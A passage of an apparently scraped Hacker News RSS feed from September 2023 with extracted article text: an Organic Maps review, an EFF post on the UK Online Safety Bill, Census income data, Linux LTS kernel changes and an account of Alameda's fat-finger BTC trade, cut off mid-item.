data-src="/assets/img/how-equifax-was-breached-in-2017/pixel.png" alt="p" data-proofer-ignore="" src="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/pixel.png"></a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Organic Maps: An open-source maps app that doesn't suck (280 pts)]]></title>
            <link>https://hardfault.life/p/organic-maps-review</link>
            <guid>37592712</guid>
            <pubDate>Thu, 21 Sep 2023 02:54:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://hardfault.life/p/organic-maps-review">https://hardfault.life/p/organic-maps-review</a>, See on <a href="https://news.ycombinator.com/item?id=37592712">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>A couple weeks ago while perusing Hacker News, I came across an open-source maps app
called <a href="https://organicmaps.app/">Organic Maps</a>. Proudly billing itself as privacy-focused and
open-source, Organic Maps’ website claims that it is “one of a few applications
nowadays that supports 100% of features without an active internet connection.”</p>
<h2>A World’s Worth Of Doubts</h2>
<p>Map apps are complicated. They must handle tons and tons of road
data. That data has to be accurate - even the most complex interchanges must be
charted correctly. That data needs to be kept up-to-date with information about
closures and other conditions. The routing algorithm has to be effective enough
to get the user to their destination in a safe and timely manner. It also can’t
just sit there saying “recalculating” for minutes on end every time you make a
wrong turn.</p>
<p>Google Maps, Apple Maps, and Waze have elevated the average person’s expectations for a maps app.
15 years ago, a little Garmin GPS mounted to your windshield would give
simple “turn left, turn right” commands using data loaded to an SD card. Today,
a maps app must know if there is traffic ahead, and re-route you accordingly.
It must know which lane(s) you need to use to make a turn. It must know if
there is a state trooper hiding around the corner with a radar gun. It must
know about speed cameras, stalled vehicles, and construction, and all of this
data must be received in real time… right?</p>
<h2>Organic Maps Under Pressure</h2>
<p>I had an emergency last week that requried me to drive more than 300 miles into
the rural Midwest with my fiancee. Having learned of this emergency mere minutes
after reading about Organic Maps, I decided to install the app and put it to
the test on this sudden road trip.</p>
<p>My first stop was downtown Chicago, where I would pick up my fiancee before
leaving the city. I didn’t need the app for this part of the drive, but I
figured it would make a good sanity check. Thankfully, Organic Maps gave me a
sane route that used the interstate and major streets competently.</p>
<p>I was pleased initially, but then I looked at its ETA: 4 minutes! To drive 5
miles! In Chicago! As it turns out, Organic Maps has no traffic data. I already
felt like I had made a mistake by even giving this thing a try. If it doesn’t
know about traffic, then surely
it will be worthless in one of the largest and most congested cities in the
United States!</p>
<p>I opened Google Maps to compare. Google happily presented me with
long stretches of red, indicating the heavy traffic that I knew was there. It
estimated that I would take 14 minutes to arrive downtown (it was right). Yet,
Google chose the same route as Organic Maps. <strong>Google’s traffic data offered me
a much more accurate arrival time, but Google Maps couldn’t actually get me to my
destination faster than Organic Maps.</strong></p>
<p>As it turns out, this wasn’t a fluke. Google Maps and Waze altered our
expectations for a map app’s capabilities, without actually getting
us to our destinations faster. <a href="https://trid.trb.org/view/1495267">This study</a> indicates that modern maps apps
haven’t magically gotten rid of traffic jams, though they have managed to clog up
local streets that didn’t see heavy traffic before. Other sources agree with
this conclusion, including <a href="https://citymonitor.ai/community/neighbourhoods/google-maps-local-traffic">this article from City Monitor</a> that cites some
fascinating UK Department of Transport data. The Atlantic also has
<a href="https://www.theatlantic.com/technology/archive/2018/03/mapping-apps-and-the-price-of-anarchy/555551/">a great writeup</a> on the topic.
Even the most clever of traffic-aware apps can’t get you to your destination a
whole lot faster than a “dumb” app. Traffic is sort of like
energy: you can move it around, but you can’t get rid of it.</p>
<h2>The First Drive</h2>
<p>My impression of Organic Maps immediately improved when I started driving. It
talks! It knows exit numbers! It can tell you which lanes to use! Sure, it isn’t
as polished as Google Maps, but all of the functionality is present. The UI is
high-contrast and easy to read, although I wish the text showing exit
numbers/street names was a little bigger. When you’re simply on the road and
following directions, Organic Maps feels every bit as intuitive as Google Maps.</p>
<p>As my fiancee and I prepared to set off into the boonies, I plugged in the address of our
hotel. About 45 seconds later, Organic Maps returned the 300-mile route to
our destination. It can take a lot longer to calculate longer routes using your
phone’s processor instead of a huge cloud server. It didn’t really bother me
though; 45 seconds is nothing compared to the 6-hour trip ahead. If that’s the
cost of using a maps app that doesn’t spray your personal data all over the
internet, I’ll pay it.</p>
<h2>Heading Into The Boonies</h2>
<p>This drive is familiar to me. As a child, I saw these same roads drift by from
the backseat of a minivan. This was before smartphones and tablets
were in the hands of every child in the country, so I actually paid
attention to the road signs, the condition of each highway, and the
subtle changes in the natural environment. I know those long stretches of the
rural Midwest like a child knows their hometown, through a mental map as vivid
as it is inaccurate.</p>
<p>As we sliced through miles of picturesque nothingness, Organic Maps blended
seamlessly into the background. As interstates gave way to state numbered highways, Organic Maps’
charmingly robotic voice prompted me a couple thousand feet in advance of each
turn. As state numbered highways gave way to county roads, Organic Maps
avoided dirt roads that would look like shortcuts to the uninformed. When the
sun fell below the horizon, Organic Maps switched to a dark mode that prevented
my phone’s screen from blinding me as a drove.</p>
<p>Organic Maps was at its best on this long drive. After I stopped for gas in
a town with no cell service, I had no trouble getting my maps back. Organic
Maps doesn’t need an internet connection to route you to your destination. This
no-network-necessary approach means that you don’t have to fear losing your
route when cell service isn’t available. This feature alone is enough reason to
keep it installed on your phone, just in case you need it.</p>
<h2>Putting a Town On The Map</h2>
<p>Organic Maps performed exceptionally well while driving through rural America,
but once I arrived at my destination, it struggled. This
town isn’t small (technically it qualifies as a city!), and it’s well-known within
its state, yet there were dozens of businesses missing from the map. Many of the
missing businesses weren’t new either - at least a few
have been around for over a decade, yet somehow never made it into
Organic Maps’ database. I could only find my hotel by address; Organic Maps
knew the address, but didn’t know that there was a hotel there.</p>
<p>Organic Maps uses an open map database called <a href="https://www.openstreetmap.org/">OpenStreetMap</a>. Although
OpenStreetMap has very accurate data about streets, addresses, and highways,
its knowledge of what’s actually located at any given address is spotty at best.
Thankfully, Organic Maps has a half-solution to this problem: contribute OpenStreetMap data
yourself! Organic Maps lets you contribute data to OpenStreetMap. Simply press
and hold where the business should be, tap “add a place to the map,” and fill
out the form. I ended up spending an hour of downtime adding information about
various restaurants, libraries, museums, and stores around town. It
would take far longer to add every business in the area, but it’s a good start.
I love being able to contribute to OpenStreetMap, and Organic Maps makes it easy
to do that.</p>
<h2>Fumbling The ITR</h2>
<p>If you need to come into downtown Chicago from the east, there are two ways you
can go. The expensive way is to take I-90 via the Indiana Toll Road (“ITR” for
short) and Chicago Skyway. The cheap way is to take I-94 south to the I-80/I-294
interchange. Both routes eventually put you on <a href="https://en.wikipedia.org/wiki/Dan_Ryan_Expressway">the Dan Ryan</a>, a 14-lane
behemoth heading straight into the heart of the city. Just writing about the
ITR makes my skin crawl, and apparently it also makes Organic Maps upset.</p>
<p>Nearing the end of the drive home, as my impending merge onto the ITR loomed,
Organic Maps did something strange. It told me to take the wrong ramp, which
would have put me on the ITR heading west, then make a U-turn and head
east. I know this drive well enough to know it was asking me to do something
physically impossible. So, I did what I had been trying to avoid the entire
weekend: I disobeyed Organic Maps. I took the correct ramp, Organic Maps quickly
recalculated, and everything went back to normal.</p>
<p>I tried re-creating this problem a couple days later, and Organic Maps did it
again! Here is the incorrect route:</p>
<p><img src="https://hardfault.life/public/organic-maps-review/organic-bad-route.png" alt="Screenshot of the Organic Maps app showing an incorrect route"></p>
<p>Notice the little kink in the route near the top-right corner of the image -
that’s a U-turn that doesn’t actually exist. Even more bizarre is that
the <a href="https://www.openstreetmap.org/">OpenStreetMap</a> website gets the correct route:</p>
<p><img src="https://hardfault.life/public/organic-maps-review/osm-correct-route.png" alt="Screenshot of the OpenStreetMap web app showing the correct route"></p>
<p>This shook my confidence in Organic Maps, but after more than 1000 miles of
otherwise worry-free routing, this seemed to be a one-off bug. I created an
<a href="https://github.com/organicmaps/organicmaps/issues/5983">issue on GitHub</a> and the developers responded swiftly. Unfortunately, it can
take a few weeks for an OpenStreetMap update to get pushed out, so now I
(and anyone else driving westbound into Chicago) must wait for the new, more
accurate map data.</p>
<h2>Returning Home</h2>
<p>Organic Maps has proven itself to be a competent alternative to Google Maps,
at least for my purposes. Its UI is simple and intuitive. Organic Maps gets me
to my destinations as quickly and safely as Google Maps, even though it doesn’t
have Google’s extensive traffic data. Organic Maps isn’t operated by megacorp
trying to make you buy things.</p>
<p>Organic Maps is certainly not for everyone. If you are constantly
running out of storage space on your phone, Organic Maps’ need to download
hundreds of megabytes of map data onto your phone will be a non-starter. On the
other hand, its offline map storage means that it doesn’t need an internet
connection to get you to your destination.</p>
<p>Incorrect or missing businesses are the biggest inconvenience of using Organic Maps.
I occasionally switch back to Google Maps when a business or address is missing.
In this regard, Organic Maps can only improve if people use it. If your destination
is missing, add it. If some information is out of date, update it. I would
strongly encourage anyone to try Organic Maps for a week or two. I gave it an
honest chance, and it made a lasting impression.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[UK Parliament undermined the privacy, security, freedom of all internet users (603 pts)]]></title>
            <link>https://www.eff.org/deeplinks/2023/09/today-uk-parliament-undermined-privacy-security-and-freedom-all-internet-users</link>
            <guid>37592699</guid>
            <pubDate>Thu, 21 Sep 2023 02:51:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eff.org/deeplinks/2023/09/today-uk-parliament-undermined-privacy-security-and-freedom-all-internet-users">https://www.eff.org/deeplinks/2023/09/today-uk-parliament-undermined-privacy-security-and-freedom-all-internet-users</a>, See on <a href="https://news.ycombinator.com/item?id=37592699">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <article role="article">
  
  
  <div><p><span>The U.K. Parliament </span><a href="https://www.reuters.com/world/uk/uks-online-safety-bill-passed-by-parliament-2023-09-19/"><span>has passed the Online Safety Bill</span></a><span> (OSB), which says it will make the U.K. “the safest place” in the world to be online. In reality, the OSB will lead to a much more censored, locked-down internet for British users. The bill could empower the government to undermine not just the privacy and security of U.K. residents, but <a href="https://www.eff.org/deeplinks/2021/08/if-you-build-it-they-will-come-apple-has-opened-backdoor-increased-surveillance">internet users worldwide</a>.&nbsp;</span></p>
<h3><b>A Backdoor That Undermines Encryption</b></h3>
<p><span>A clause of the bill allows Ofcom, the British telecom regulator, to serve a notice requiring tech companies to scan their users–all of them–for child abuse content.This would&nbsp;affect&nbsp;even messages and files that are end-to-end encrypted to protect user privacy. As enacted, the OSB allows the government to force companies to build technology that can scan regardless of encryption–in other words, build a backdoor.&nbsp;</span></p>
<p><span>These types of </span><a href="https://www.eff.org/deeplinks/2019/11/why-adding-client-side-scanning-breaks-end-end-encryption"><span>client-side scanning systems</span></a><span> amount to </span><a href="https://arxiv.org/abs/2110.07450"><span>“Bugs in Our Pockets,”</span></a><span> and a group of leading computer security experts has reached the same conclusion as EFF–they undermine privacy and security for everyone. That’s why EFF has </span><a href="https://www.eff.org/deeplinks/2023/07/uk-government-very-close-eroding-encryption-worldwide"><span>strongly opposed the OSB</span></a><span> for </span><a href="https://www.eff.org/deeplinks/2022/08/uks-online-safety-bill-attacks-free-speech-and-encryption"><span>years</span></a><span>.&nbsp;</span></p>
<p><span>It’s a basic human right to have a private conversation. This right is even more important for the most vulnerable people. If the U.K. uses its new powers to scan people’s data, lawmakers will damage&nbsp;the security people need to protect themselves from harassers, data thieves, authoritarian governments, and others. Paradoxically, U.K. lawmakers have created these new risks in the name of online safety.&nbsp;</span></p>
<p><span>The U.K. government has </span><a href="https://www.eff.org/deeplinks/2023/09/uk-government-knows-how-extreme-online-safety-bill"><span>made some recent statements</span></a><span> </span><span>indicating that it actually realizes that getting around end-to-end encryption isn’t compatible with protecting user privacy. But given the text of the law, neither the government’s private statements to tech companies, nor its weak public assurances, are enough to protect the human rights of British people or internet users around the world.&nbsp;</span></p>
<h3><b>Censorship and Age-Gating</b></h3>
<p><span>Online platforms will be expected to remove content that the U.K. government views as inappropriate for children. If they don’t, they’ll face heavy penalties. The problem is, in the U.K. as in the U.S., </span><a href="https://www.eff.org/deeplinks/2023/08/us-government-about-control-speech-online-protect-kids"><span>people do not agree about what type of content is harmful for kids</span></a><span>. Putting that decision in the hands of government regulators will lead to politicized censorship decisions.&nbsp;</span></p>
<p><span>The OSB will also lead to </span><a href="https://www.eff.org/deeplinks/2023/03/age-verification-mandates-would-undermine-anonymity-online"><span>harmful age-verification systems</span></a><span>. This violates fundamental principles about anonymous and simple access that has existed since the beginning of the Internet. You shouldn’t have to show your ID to get online. Age-gating systems meant to keep out kids invariably lead to adults losing their rights to private speech, and anonymous speech, which is sometimes necessary.&nbsp;</span></p>
<p><span>In the coming months, we’ll be watching what type of regulations the U.K. government publishes describing how it will use these new powers to regulate the internet. If the regulators claim their right to require the creation of dangerous backdoors in encrypted services, we expect encrypted messaging services to </span><a href="https://techcrunch.com/2023/06/27/an-encryption-exodus-looms-over-uks-online-safety-bill/"><span>keep their promises</span></a><span> and withdraw from the U.K. if that nation’s government&nbsp;compromises their ability to protect other users.&nbsp;</span></p>

</div>

          </article>
    </div><div>
          <h2>Join EFF Lists</h2>
        
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Terry Tao's generals (272 pts)]]></title>
            <link>https://web.math.princeton.edu/generals/tao_terence</link>
            <guid>37591652</guid>
            <pubDate>Thu, 21 Sep 2023 00:00:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://web.math.princeton.edu/generals/tao_terence">https://web.math.princeton.edu/generals/tao_terence</a>, See on <a href="https://news.ycombinator.com/item?id=37591652">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Median Household Income After Taxes Fell 8.8% in 2022 (165 pts)]]></title>
            <link>https://www.census.gov/library/stories/2023/09/median-household-income.html</link>
            <guid>37591478</guid>
            <pubDate>Wed, 20 Sep 2023 23:35:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.census.gov/library/stories/2023/09/median-household-income.html">https://www.census.gov/library/stories/2023/09/median-household-income.html</a>, See on <a href="https://news.ycombinator.com/item?id=37591478">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="textcore-ce5d68a1d8">
    <p>Real median household income after taxes fell 8.8% to $64,240 from 2021 to 2022 and the poverty rate after taxes as measured by the Supplemental Poverty Measure (SPM) increased 59% to 12.4%.</p>
<p>These significant changes in <i>after-tax</i> income and poverty rates of U.S. households were much larger than the annual changes in <i>before-tax</i> income and poverty, according to U.S. Census Bureau data released today.</p>

</div><div>
<p>The expiration of expansions to refundable tax credits had a particularly important impact on SPM poverty.</p>

    

</div><div id="textcore-824ce80faa">
    <p>The Census Bureau reports, <i>Income in the United States: 2022 </i>and <i>Poverty in the United States: 2022</i>, show that <i>before</i> taxes, median household income declined 2.3% to $74,580 and the poverty rate (11.5%), as measured by the official poverty measure, was not statistically different from 2021.</p>
<p>This dramatic difference can be attributed to key changes in federal tax policy.</p>
<p>In 2022, several policies enacted by the <a href="https://www.whitehouse.gov/american-rescue-plan/" target="_blank">American Rescue Plan Act (ARPA)</a> expired, including an expansion of the <a href="https://www.irs.gov/newsroom/changes-to-the-earned-income-tax-credit-for-the-2022-filing-season" target="_blank">Earned Income Tax Credit (EITC)</a> for filers without children and full refundability of the <a href="https://www.irs.gov/credits-deductions/2021-child-tax-credit-and-advance-child-tax-credit-payments-topic-c-calculation-of-the-2021-child-tax-credit" target="_blank">Child Tax Credit (CTC)</a> and <a href="https://www.irs.gov/newsroom/child-and-dependent-care-credit-faqs" target="_blank">Child and Dependent Care Tax Credit (CDCTC)</a>. ARPA also increased the maximum amount of CTC.</p>
<p>In 2020 and 2021, most households also received <a href="https://home.treasury.gov/policy-issues/coronavirus/assistance-for-american-families-and-workers/economic-impact-payments" target="_blank">Economic Impact Payments (EIP)</a> that were no longer issued in 2022.</p>
<p>The rollback of these tax policies had the largest effect on post-tax income among the nation’s lowest-income households.</p>
<p>In 2021, for example, post-tax income at the 10th percentile, meaning at the bottom of the income distribution, was 17.1% <i>higher</i> than the corresponding pretax income estimate, reflecting the substantial boost that lower-income households received that year from the EIP and expanded CTC.</p>
<p>In contrast, the 2022 estimates of pretax and post-tax income at the 10th percentile were not significantly different (Figure 1).</p>
<p>Lower post-tax income, particularly at the bottom of the income distribution, also resulted in an increase in income inequality.</p>
<p>The Gini index, a common measure of how spread out or unequal incomes are, for pretax income was 1.2% lower in 2022 than in 2021, reflecting real income declines at the top of the income distribution. However, the post-tax Gini index was 3.2% higher due to substantial declines in post-tax income among lower-income households.</p>

</div><div id="textcore-44a48ec46d">
    <p>The decline in post-tax income also corresponds to an increase in the SPM, which incorporates noncash government assistance programs like the Supplemental Nutritional Assistance Program (SNAP) and taxes, through income and payroll taxes and refundable tax credits like the CTC and EITC. &nbsp;</p>
<p>The 4.6 percentage point increase in the SPM poverty rate was driven almost entirely by the change in tax policy (Figure 2). &nbsp;When a version of the SPM excluding taxes is examined, the poverty rate did not change: 12.6% in 2022, not statistically different from 2021.</p>

</div><div id="textcore-a1e0b57298">
    <p>The expiration of expansions to refundable tax credits had a particularly important impact on SPM poverty (Figure 3).</p>
<p>In 2021, 9.6 million people were kept out of poverty due to refundable tax credits. This number declined to 6.4 million in 2022 as the pandemic era expansions expired. The effect declined for each of the major age groups, with 3.5 million children lifted out of poverty in 2022 compared to 4.9 million in 2021.</p>

</div><div id="textcore-efa5988a95">
    <p>More information on Income and Poverty is available in the reports <a href="https://www.census.gov/library/publications/2023/demo/p60-279.html">Income in the United States: 2022</a> and <a href="https://www.census.gov/library/publications/2023/demo/p60-280.html">Poverty in the United States: 2022</a></p>
<p>The technical documentation page includes information on confidentiality protection, methodology, sampling and nonsampling error, and definitions. All comparative statements in this report have undergone statistical testing, and, unless otherwise noted, all comparisons are statistically significant at the 90 percent significance level.<a href="https://www.census.gov/programs-surveys/cps/technical-documentation/complete.html"></a></p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Linux gives up on 6-year LTS kernels, says they’re too much work (245 pts)]]></title>
            <link>https://arstechnica.com/gadgets/2023/09/linux-gives-up-on-6-year-lts-thats-fine-for-pcs-bad-for-android/</link>
            <guid>37591050</guid>
            <pubDate>Wed, 20 Sep 2023 22:36:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/gadgets/2023/09/linux-gives-up-on-6-year-lts-thats-fine-for-pcs-bad-for-android/">https://arstechnica.com/gadgets/2023/09/linux-gives-up-on-6-year-lts-thats-fine-for-pcs-bad-for-android/</a>, See on <a href="https://news.ycombinator.com/item?id=37591050">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <header>
            <h4>
      Pay maintainers!    —
</h4>
            
            <h2 itemprop="description">Linux's six-year long-term support was meant to help embedded devices.</h2>
                    </header>
        <div itemprop="articleBody">
                                    
<figure>
  <img src="https://cdn.arstechnica.net/wp-content/uploads/2013/09/linux-penguin.jpg" alt="Linux gives up on 6-year LTS kernels, says they’re too much work">
      <figcaption></figcaption>  </figure>

  




<!-- cache hit 202:single/related:eef60434b7d501121954ccdc70832942 --><!-- empty -->
<p>The LTS (long-term support) period for the Linux kernel is being cut down. <a href="https://arstechnica.com/gadgets/2017/09/android-users-rejoice-linux-kernel-lts-releases-are-now-good-for-6-years/">In 2017</a>, the kernel jumped from two years of support to six. Now, six years later, it turns out that's a lot of work. <a href="https://www.zdnet.com/article/long-term-support-for-linux-kernel-to-be-cut-as-maintainence-remains-under-strain/">ZDNet</a> reports that at the Open Source Summit Europe this week (videos will be out in a few weeks), <a href="https://lwn.net/">Linux Weekly News</a> executive editor Jonathan Corbet announced the Linux kernel will return to two years of LTS support.</p>
<p>The plan to cut back down to two years isn't instant. The Linux community is still honoring the <a href="https://www.kernel.org/category/releases.html">current end-of-life timelines</a>, so 6.1, 5.15, 5.10, 5.4, 4.19, and 4.14 are still six years, but new kernels will only get two years. Even this six-year window was supposed to be an optional thing when it started, with the release page FAQ saying, "Each new longterm kernel usually starts with only a 2-year projected EOL that can be extended further if there is enough interest from the industry at large to help support it for a longer period of time." The reality was that everything received a six-year life span, and now that will no longer be the case.</p>
<p>Corbet cited a mix of lack of use and a lack of support for why Linux is cutting back on LTS kernels. Corbet says, "There's really no point to maintaining [old kernels] for that long because people are not using them." The other big problem is the burnout from maintainers, which are often unpaid and could use a lot more support from the billion-dollar companies that benefit from using Linux.</p>                                            
                                                        
<h2>But what about Android?</h2>
<p>Two years seems like a fine support window for PCs, but what about Android? The original LTS extension was mainly made with Android and Internet of Things devices in mind—it was announced during an Android Linux talk by Google developer Iliyan Malchev. The problem was that on PCs, two years only represents the time between kernel <em>updates</em>, so that's a fine timeline. Embedded devices tend not to update the kernel, though, so those "two years" represent most of the development cycle and the entire consumer support window, and that's not long enough.</p>
  <div>
    <ul>
              <li data-thumb="https://cdn.arstechnica.net/wp-content/uploads/2017/09/40-1-150x150.jpg" data-src="https://cdn.arstechnica.net/wp-content/uploads/2017/09/40-1.jpg" data-responsive="https://cdn.arstechnica.net/wp-content/uploads/2017/09/40-1-980x537.jpg 1080, https://cdn.arstechnica.net/wp-content/uploads/2017/09/40-1-1440x789.jpg 2560" data-sub-html="#caption-1177141">
          <figure>
            
                          <figcaption id="caption-1177141">
                <span></span>
                                  <p>
                    Google's LTS slide from 2017. With only two years of Linux kernel support (the blue bar), the kernel's support window is almost over by the time an Android device is developed and ready to ship.                   </p>
                                                  
                              </figcaption>
                      </figure>
        </li>
              <li data-thumb="https://cdn.arstechnica.net/wp-content/uploads/2017/09/39-150x150.jpg" data-src="https://cdn.arstechnica.net/wp-content/uploads/2017/09/39.jpg" data-responsive="https://cdn.arstechnica.net/wp-content/uploads/2017/09/39-980x537.jpg 1080, https://cdn.arstechnica.net/wp-content/uploads/2017/09/39-1440x789.jpg 2560" data-sub-html="#caption-1177099">
          <figure>
            
                          <figcaption id="caption-1177099">
                <span></span>
                                  <p>
                    With six years of support, there's plenty of support time for device development <em>and</em> the product's ownership life cycle.                  </p>
                                                  
                              </figcaption>
                      </figure>
        </li>
          </ul>
  </div>

<p>The original picture Google painted in 2017 was that phones take two years to be developed and that the kernel is locked in near the beginning of the engineering process. The LTS kernel would be hitting end-of-life right around when the phone finally shipped, and customers would use obsolete kernels for the lifetime of their devices. The Android kernel development process is a whole pile of forks: First, Google forks from a new Linux LTS to make the "Android Common" kernel, then that is sent to SoC vendors like Qualcomm and forked for each model of SoC, then <em>that</em> fork is sent to device makers, which fork it again for each model of device. It takes a while.</p>
<p>Are things better in 2023? I don't know about that. The Android kernel docs have a Linux "<a href="https://source.android.com/docs/core/architecture/kernel/android-common#compatibility-matrix">compatibility matrix</a>" for each version of Android, and Android 14—releasing any day now—still supports launching new devices with Linux 5.4, a 4-year-old kernel. That's going to <em>start</em> a new window of support, remember, so even with a paltry two years of ownership, that's a six-year-old kernel. That's also just for new devices. You can upgrade to Android 14 from Linux 4.14, which goes back to 2017. You can see how Google arrived at the six-year number. It's hard to know what every cheap Android phone is doing at any given time, but I assume these are all supported because they are still needed.</p>                                            
                                                        
<p>There are also smartwatches to consider, where things are even worse. The Pixel Watch is so ashamed of its Linux kernel that it's not even listed in the settings, but the device launched in 2022 with <a href="https://twitter.com/MishaalRahman/status/1580695517763276800/photo/1">Linux kernel 4.19</a>, a 4-year-old kernel at the time.</p>
<figure><img alt="Android's GKI has a bunch of modules for hardware support that you can plug into the kernel. " src="https://cdn.arstechnica.net/wp-content/uploads/2023/09/generic-kernel-image-architecture.png" width="740" height="395"><figcaption><p>Android's GKI has a bunch of modules for hardware support that you can plug into the kernel. </p><p>Google</p></figcaption></figure>
<p>Android's big advancement since 2017 is <a href="https://arstechnica.com/gadgets/2021/11/android-12-the-ars-technica-review/3/">the GKI</a>, Google's "Generic Kernel Image," which cuts down on the "fork of a fork of a fork" Android kernel development process. That first fork, Android Common, adds all the Android compatibility stuff to Linux, so that still happens with the GKI, but fork No. 2 and 3 are for hardware compatibility, and the GKI instead moves those to modules. Further out, there is a plan to move to <a href="https://arstechnica.com/gadgets/2021/09/android-to-take-an-upstream-first-development-model-for-the-linux-kernel/">mainline Linux.&nbsp;</a></p>
<p>Even GKI phones still don't do major kernel updates, though. You get minor LTS security updates, but the Pixel 6, the first GKI phone, launched with Linux 5.10 and is still on Linux 5.10. That's a 3-year-old kernel. If this trend keeps up, when it gets its last security update in 2027, it will have a 7-year-old kernel. Google <a href="https://arstechnica.com/gadgets/2020/09/the-android-11-interview-googlers-answer-our-burning-questions/2/">has said</a> before that major GKI kernel updates are in the plans eventually. There's even mention of <a href="https://source.android.com/docs/core/architecture/kernel/gki-faq">major kernel swaps</a> in the documents, but the landmark of updating a production consumer device to a major new GKI version is not something that has happened yet. <a href="https://9to5google.com/2023/08/28/google-pixel-8-android-os-updates/">Rumor has it</a> that the Pixel 8 will have a longer support window, so maybe we'll see major kernel updates launch with that phone.</p>

                                                </div>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Alameda lost tens of millions because of a fat fingering mistake (221 pts)]]></title>
            <link>https://www.adityabaradwaj.com/part-2-the-fat-finger/</link>
            <guid>37590544</guid>
            <pubDate>Wed, 20 Sep 2023 21:35:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.adityabaradwaj.com/part-2-the-fat-finger/">https://www.adityabaradwaj.com/part-2-the-fat-finger/</a>, See on <a href="https://news.ycombinator.com/item?id=37590544">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>

    

    <div>
        <p>OR</p><p>The story of how a misplaced decimal point at Alameda Research caused a market crash that echoed around the world.</p><p>This incident happened just a few weeks after I joined Alameda. I had just gotten a hang of our engineering workflows and was starting to wrap my head around our trading systems.At a high level, Alameda's trading operated in two modes:</p><p>The main one was our semi-systematic strategies, where traders set model parameters that control a complex automated trading system. This way, traders aren't placing actual trades, but rather fine-tuning an algorithm that decides how to execute those trades at high frequency.</p><p>However every once in a while, a trader would need to manually execute a trade. Usually this might happen if our automated trading systems were being buggy due to market volatility, or if there was an arbitrage opportunity on a venue where we hadn't set up automated trading yet.</p><p>Our automated trading systems handled the vast majority of Alameda's trading. So naturally, we had sanity checks in place to make sure that the orders being sent were reasonable relative to current market prices. Not so for manual trades, which were by nature discretionary.</p><p>The tricky thing about risk is that it's usually invisible, right up until it comes around and bites you in the ass.</p><p>Well, on October 21 2021, an Alameda trader's finger slipped.</p><p>The trader was trying to sell a block of BTC in response to news, and sent out the order via our manual trading system. What they missed was the decimal point was off by a few spaces. Rather than selling BTC at the current market price, they sold it for pennies on the dollar.</p><p>The result was immediate. The price of BTC shot from a high of $65k to as low as $8k on some venues, only to be quickly restored by arbitrageurs.</p><p>The sudden price movement lit crypto Twitter on fire as traders scrambled to figure out what was going on:</p><figure><img src="https://www.adityabaradwaj.com/content/images/2023/09/bitcoin-flash-crash-twitter-collage.png" alt="" loading="lazy" width="2000" height="1429" srcset="https://www.adityabaradwaj.com/content/images/size/w600/2023/09/bitcoin-flash-crash-twitter-collage.png 600w, https://www.adityabaradwaj.com/content/images/size/w1000/2023/09/bitcoin-flash-crash-twitter-collage.png 1000w, https://www.adityabaradwaj.com/content/images/size/w1600/2023/09/bitcoin-flash-crash-twitter-collage.png 1600w, https://www.adityabaradwaj.com/content/images/2023/09/bitcoin-flash-crash-twitter-collage.png 2100w" sizes="(min-width: 720px) 720px"><figcaption>A snapshot of crypto Twitter that day</figcaption></figure><p>News outlets started picking up too. Binance US - which was the epicenter of the flash crash - released a statement claiming that it had been caused by one of their "institutional traders" who had a "bug in their trading algorithm".</p><p>I guess Caroline had made some phone calls.</p><figure><img src="https://www.adityabaradwaj.com/content/images/2023/09/Screenshot-2023-09-19-at-21.26.42.png" alt="" loading="lazy" width="1840" height="1902" srcset="https://www.adityabaradwaj.com/content/images/size/w600/2023/09/Screenshot-2023-09-19-at-21.26.42.png 600w, https://www.adityabaradwaj.com/content/images/size/w1000/2023/09/Screenshot-2023-09-19-at-21.26.42.png 1000w, https://www.adityabaradwaj.com/content/images/size/w1600/2023/09/Screenshot-2023-09-19-at-21.26.42.png 1600w, https://www.adityabaradwaj.com/content/images/2023/09/Screenshot-2023-09-19-at-21.26.42.png 1840w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.adityabaradwaj.com/content/images/2023/09/Screenshot-2023-09-19-at-21.26.57.png" alt="" loading="lazy" width="2000" height="1788" srcset="https://www.adityabaradwaj.com/content/images/size/w600/2023/09/Screenshot-2023-09-19-at-21.26.57.png 600w, https://www.adityabaradwaj.com/content/images/size/w1000/2023/09/Screenshot-2023-09-19-at-21.26.57.png 1000w, https://www.adityabaradwaj.com/content/images/size/w1600/2023/09/Screenshot-2023-09-19-at-21.26.57.png 1600w, https://www.adityabaradwaj.com/content/images/2023/09/Screenshot-2023-09-19-at-21.26.57.png 2072w" sizes="(min-width: 720px) 720px"></figure><p>Alameda's losses on the fat-finger trade were staggering - on the order of tens of millions. But because it had been an honest mistake, there wasn't much to do except to implement additional sanity checks for manual trades. And that's what we did.</p><p>That's usually how things worked at Alameda - we would wait until something broke, and then rush to fix it. Which is why it took us so long to implement sanity checks that any "traditional" trading firm would have never started trading without.</p><p>After that, it was back to business as usual. According to SBF, the utility we gained by moving fast outweighed the occasional costs we paid due to poor risk checks, hacks, and the like. This was SBF's work philosophy, and it drove the culture he created at Alameda and FTX</p><p>For almost two years, the BTC flash crash incident has remained a mystery in the minds of the public. Now you know who was responsible, and what was happening behind the scenes.</p><figure><img src="https://www.adityabaradwaj.com/content/images/2023/09/Screenshot-2023-09-19-at-21.06.36.png" alt="" loading="lazy" width="1204" height="234" srcset="https://www.adityabaradwaj.com/content/images/size/w600/2023/09/Screenshot-2023-09-19-at-21.06.36.png 600w, https://www.adityabaradwaj.com/content/images/size/w1000/2023/09/Screenshot-2023-09-19-at-21.06.36.png 1000w, https://www.adityabaradwaj.com/content/images/2023/09/Screenshot-2023-09-19-at-21.06.36.png 1204w" sizes="(min-width: 720px) 